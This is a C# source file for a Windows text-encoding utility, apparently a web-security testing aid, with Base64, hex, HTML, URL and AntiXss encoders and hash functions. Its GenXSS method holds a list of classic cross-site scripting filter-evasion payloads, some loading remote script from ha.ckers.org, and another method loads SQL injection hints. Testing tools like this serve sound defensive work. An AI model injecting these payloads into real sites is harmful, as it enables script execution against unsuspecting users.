using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Microsoft.Security.Application;
using Microsoft.Win32;
using System.IO;

namespace TransForm
{
	/// <summary>
	/// Interaction logic for Window1.xaml
	/// </summary>
	public partial class Window1 : Window
	{
		public Window1()
		{
			InitializeComponent();
		}

		private void TransFormB2T_Click(object sender, RoutedEventArgs e)
		{
			StartBox.Text = TransFormText(FinishBox.Text, (bool)encodeLinebreaks.IsChecked);
		}

		private void TransFormT2B_Click(object sender, RoutedEventArgs e)
		{
			FinishBox.Text = TransFormText(StartBox.Text, (bool)encodeLinebreaks.IsChecked);
		}

		private string TransFormText(string start, bool encodeBreaks)
		  {
			  string finish = "";
			  switch (TypeSelector.Text)
			  {
				  case "Base64Encode":
					  if (encodeBreaks)
						  finish = TransFormer.Base64Encode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.Base64Encode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Base64Decode":
					  finish = TransFormer.Base64Decode(start);
					  break;
				  case "AntiXss.HtmlAttributeEncode":
					  if (encodeBreaks)
						  finish = AntiXss.HtmlAttributeEncode(start);
					  else
						  finish = AntiXss.HtmlAttributeEncode(start).Replace("&#13;&#10;", "\r\n");
					  break;
				  case "AntiXss.HtmlEncode":
					  if (encodeBreaks)
						  finish = AntiXss.HtmlEncode(start);
					  else
						  finish = AntiXss.HtmlEncode(start).Replace("&#13;&#10;", "\r\n");
					  break;
				  case "AntiXss.JavaScriptEncode":
					  if (encodeBreaks)
						  finish = AntiXss.JavaScriptEncode(start);
					  else
						  finish = AntiXss.JavaScriptEncode(start).Replace("\\x0d\\x0a", "'\r\n'");
					  break;
				  case "AntiXss.UrlEncode":
					  if (encodeBreaks)
						  finish = AntiXss.UrlEncode(start);
					  else
						  finish = AntiXss.UrlEncode(start).Replace("%0d%0a", "\r\n");
					  break;
				  case "AntiXss.VisualBasicScriptEncode":
					  if (encodeBreaks)
						  finish = AntiXss.VisualBasicScriptEncode(start);
					  else
						  finish = AntiXss.VisualBasicScriptEncode(start).Replace("&chrw(13)&chrw(10)&", "\r\n");
					  break;
				  case "AntiXss.XmlAttributeEncode":
					  if (encodeBreaks)
						  finish = AntiXss.XmlAttributeEncode(start);
					  else
						  finish = AntiXss.XmlAttributeEncode(start).Replace("&#13;&#10;", "\r\n");
					  break;
				  case "AntiXss.XmlEncode":
					  if (encodeBreaks)
						  finish = AntiXss.XmlEncode(start);
					  else
						  finish = AntiXss.XmlEncode(start).Replace("&#13;&#10;", "\r\n");
					  break;
				  case "Hex Encode":
					  if (encodeBreaks)
						  finish = TransFormer.ConvertStringToHexString(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.ConvertStringToHexString(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Binary Encode":
					  if (encodeBreaks)
						  finish = TransFormer.ConvertHexStringToBinaryString(Encoding.ASCII.GetBytes(start));
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.ConvertHexStringToBinaryString(Encoding.ASCII.GetBytes(line.Replace("\n", ""))) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Force Full URL Encode":
					  if (encodeBreaks)
						  finish = TransFormer.ForceFullURLEncode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.ForceFullURLEncode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Force Full HTML Encode":
					  if (encodeBreaks)
						  finish = TransFormer.ForceFullHTMLEncode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.ForceFullHTMLEncode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Force Full JavaScript Encode":
					  if (encodeBreaks)
						  finish = TransFormer.ForceFullJavaScriptEncode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.ForceFullJavaScriptEncode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "HTML Decode":
					  if (encodeBreaks)
						  finish = TransFormer.HTMLDecode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.HTMLDecode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "URL Decode":

					  if (encodeBreaks)
						  finish = TransFormer.URLDecode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.URLDecode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Basic HTML Encode":
					  if (encodeBreaks)
						  finish = TransFormer.BasicHTMLEncode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.BasicHTMLEncode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Basic URL Encode":
					  if (encodeBreaks)
						  finish = TransFormer.BasicURLEncode(start);
					  else
					  {
						  StringBuilder sb = new StringBuilder();
						  foreach (string line in start.Split('\r'))
						  {
							  sb.Append(TransFormer.BasicURLEncode(line.Replace("\n", "")) + "\r\n");
						  }
						  finish = sb.ToString();
					  }
					  break;
				  case "Parse Query String":
					  finish = TransFormer.ParseQueryString(start);
					  break;
				  case "Validate With String Info":
					  finish = TransFormer.ValidateWithStringInfo(start);
					  break;
				  case "Hash - CRC16":
					  finish = TransFormer.CRC16(start);
					  break;
				  case "Hash - CRC32":
					  finish = TransFormer.CRC32(start);
					  break;
				  case "Hash - MD5":
					  finish = TransFormer.MD5(start);
					  break;
				  case "Hash - SHA1":
					  finish = TransFormer.SHA1(start);
					  break;
				  case "Hash - SHA256":
					  finish = TransFormer.SHA256(start);
					  break;
				  case "Hash - SHA384":
					  finish = TransFormer.SHA384(start);
					  break;
				  case "Hash - SHA512":
					  finish = TransFormer.SHA512(start);
					  break;
				  default:
					  finish = "No text converted";
					  break;
			  }
			  return finish;
		  }

		private void Exit(object sender, RoutedEventArgs e)
		{
			this.Close();
		}

		private void LineBreaks(object sender, RoutedEventArgs e)
		{
			if (StartBox.TextWrapping == TextWrapping.Wrap)
			{
				StartBox.TextWrapping = TextWrapping.WrapWithOverflow;
				FinishBox.TextWrapping = TextWrapping.WrapWithOverflow;
			}
			else if (StartBox.TextWrapping == TextWrapping.WrapWithOverflow)
			{
				StartBox.TextWrapping = TextWrapping.NoWrap;
				FinishBox.TextWrapping = TextWrapping.NoWrap;
			}
			else
			{
				StartBox.TextWrapping = TextWrapping.Wrap;
				FinishBox.TextWrapping = TextWrapping.Wrap;
			}
		}

		private void ShowAbout(object sender, RoutedEventArgs e)
		{
			AboutPage ap = new AboutPage();
			ap.Show();
		}

		private void GenAscii(object sender, RoutedEventArgs e)
		{
			int maxASCIISize = 127;

			byte[] output = new byte[maxASCIISize];

			for (int i = 1; i < maxASCIISize; i++)
			{
				output[i] = (byte)i;
			}
			StartBox.Text = Encoding.ASCII.GetString(output);
		}

		private void GenUnicode(object sender, RoutedEventArgs e)
		{
			if (MessageBoxResult.Yes == MessageBox.Show("This could take a while, are you sure?", "Warning", MessageBoxButton.YesNo, MessageBoxImage.Warning))
			{
				int maxCharSize = 65535;
				string output = "";


				for (int i = 1; i < maxCharSize; i++)
				{
					output = output + Convert.ToChar(i);
				}
				StartBox.Text = output;
			}
		}

		private void ShowHelp(object sender, RoutedEventArgs e)
		{
			if (File.Exists("help.txt"))
				StartBox.Text = File.ReadAllText("help.txt");
			else
			{
				MessageBox.Show("Couldn't find help.txt");
				StartBox.Text = "This application should help you encode and decode text using the different encoders. \r\n\r\nTry each of them separately until you get the result you want, try them together and try double encoding things for maximum effect. \r\n\r\nThe Open File Dialog also supports URLs so type one in, this will retrieve the HTML at that location!\r\n\r\nThere's even undo support, try pressing Ctrl-z :)";
			}
		}

		private void GenSQLiSQLServer(object sender, RoutedEventArgs e)
		{
			if (File.Exists("SQL Injection Cheat Sheet(SQL Server).txt"))
				StartBox.Text = File.ReadAllText("SQL Injection Cheat Sheet(SQL Server).txt");
			else
			{
				MessageBox.Show("Couldn't find SQL Injection Cheat Sheet(SQL Server).txt");
				StartBox.Text = "-- is a comment\r\n; ends the line\r\n' closes a string ";
			}
		}

		private void OpenFile(object sender, RoutedEventArgs e)
		{
			OpenFileDialog ofd = new OpenFileDialog();
			ofd.ValidateNames = true;
			ofd.Multiselect = false;
			ofd.ShowDialog();
			if (File.Exists(ofd.SafeFileName))
				StartBox.Text = File.ReadAllText(ofd.SafeFileName);
		}

		private void SaveFinish(object sender, RoutedEventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.AddExtension = true;
			sfd.DefaultExt = ".txt";
			sfd.ShowDialog();
			File.WriteAllText(sfd.SafeFileName, FinishBox.Text, Encoding.Unicode);
		}

		private void SaveStart(object sender, RoutedEventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.AddExtension = true;
			sfd.DefaultExt = ".txt";
			sfd.ShowDialog();
			File.WriteAllText(sfd.SafeFileName, StartBox.Text, Encoding.Unicode);
		}

		private void GenXSS(object sender, RoutedEventArgs e)
		{
			encodeLinebreaks.IsChecked = false;

			List<string> xsslist = new List<string>();
			xsslist.Add("';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>");
			xsslist.Add("'';!--\"<XSS>=&{()}");
			xsslist.Add("<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>");
			xsslist.Add("<IMG SRC=\"javascript:alert('XSS');\">");
			xsslist.Add("<IMG SRC=javascript:alert('XSS')>");
			xsslist.Add("<IMG SRC=javascrscriptipt:alert('XSS')>");
			xsslist.Add("<IMG SRC=JaVaScRiPt:alert('XSS')>");
			xsslist.Add("<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">");
			xsslist.Add("<IMG SRC=\" &#14;  javascript:alert('XSS');\">");
			xsslist.Add("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>");
			xsslist.Add("<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>");
			xsslist.Add("<<SCRIPT>alert(\"XSS\");//<</SCRIPT>");
			xsslist.Add("<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>");
			xsslist.Add("\\\";alert('XSS');//");
			xsslist.Add("</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>");
			xsslist.Add("¼script¾alert(¢XSS¢)¼/script¾");
			xsslist.Add("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">");
			xsslist.Add("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>");
			xsslist.Add("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>");
			xsslist.Add("<TABLE BACKGROUND=\"javascript:alert('XSS')\">");
			xsslist.Add("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">");
			xsslist.Add("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">");
			xsslist.Add("<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">");
			xsslist.Add("<DIV STYLE=\"width: expression(alert('XSS'));\">");
			xsslist.Add("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>");
			xsslist.Add("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">");
			xsslist.Add("<XSS STYLE=\"xss:expression(alert('XSS'))\">");
			xsslist.Add("exp/*<A STYLE='no\\xss:noxss(\"*//*\");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>");
			xsslist.Add("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>");
			xsslist.Add("a=\"get\";b=\"URL(ja\\\"\";c=\"vascr\";d=\"ipt:ale\";e=\"rt('XSS');\\\")\";eval(a+b+c+d+e);");
			xsslist.Add("<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>");
			xsslist.Add("<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"></BODY></HTML>");
			xsslist.Add("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>");

			StartBox.Text = "";
			foreach (string item in xsslist)
			{
				StartBox.Text += item + "\r\n\r\n";
			}
		}

		private void GenGuid(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Guid.NewGuid().ToString();
		}

		private void GenEmptyGuid(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Guid.Empty.ToString();
		}

		private void GenMaxInt16(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Int16.MaxValue.ToString();
		}

		private void GenMaxInt32(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Int32.MaxValue.ToString();
		}

		private void GenMaxInt64(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Int64.MaxValue.ToString();
		}

		private void GenMinInt16(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Int16.MinValue.ToString();
		}

		private void GenMinInt32(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Int32.MinValue.ToString();
		}

		private void GenMinInt64(object sender, RoutedEventArgs e)
		{
			StartBox.Text = Int64.MinValue.ToString();
		}

	}
}
